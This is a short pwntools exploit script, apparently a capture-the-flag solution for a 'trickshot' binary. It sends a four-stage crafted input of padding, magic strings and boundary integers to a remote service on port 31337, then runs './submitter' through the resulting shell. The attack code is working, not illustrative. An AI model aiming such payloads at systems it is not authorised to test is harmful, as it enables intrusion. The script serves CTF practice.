#!/usr/bin/env python3
import time
from pwn import *

#context.log_level = 'debug'
context.aslr = False
context.terminal = 'kitty'
context.arch = 'amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
io.recvuntil(b'Setting you up for a trickshot...\n')
time.sleep(1)

def add_offset(inp: bytes, offset: int) -> bytes:
    return bytes([(i + offset) & 0xff for i in inp])

# stage1
payload = b'A' * 50 + b'\x04fUzZ tHiS'
# stage2
payload += 320 * b'A' + b'\x11VVVVVVV'
# stage3
payload += b'A' * 82 + b'B' + b'355935599'
# stage4
payload += b'A' * 150 + b'\x83' + add_offset(p32(0x7fffffff), 3) + add_offset(p32(0x80000001), 3)
payload += b'A' * (1000 - len(payload))

#io = gdb.debug('./handout/trickshot', '''
##b *(0x555555554000 + 0x15af)
## stage 1
##b *(0x555555554000 + 0x170b)
##b *(0x555555554000 + 0x1732)
## stage 2
##b *(0x555555554000 + 0x1882)
## stage 3
##b *(0x555555554000 + 0x19e3)
## stage 4
#b *(0x555555554000 + 0x1bd3)
#c
#''')

io.send(payload)
time.sleep(1)

io.sendline(b'./submitter')
print(io.recvall(timeout=1))
io.close()
